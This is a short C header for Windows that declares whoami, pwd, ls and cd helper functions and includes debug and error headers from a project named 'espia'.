#pragma once

#include "espia_debug.h"
#include "espia_error.h"

#ifndef WINDOWS_H
#define WINDOWS_H
#include <windows.h> 
#endif

#if DEBUG
#include <stdio.h>
#endif

void whoami(LPWSTR buffer, INT size_buffer);
void pwd(LPWSTR buffer, INT size_buffer);
void ls(INT (*callback)(PWSTR buffer, INT size_buffer));
void cd(PWSTR path, PWSTR buffer);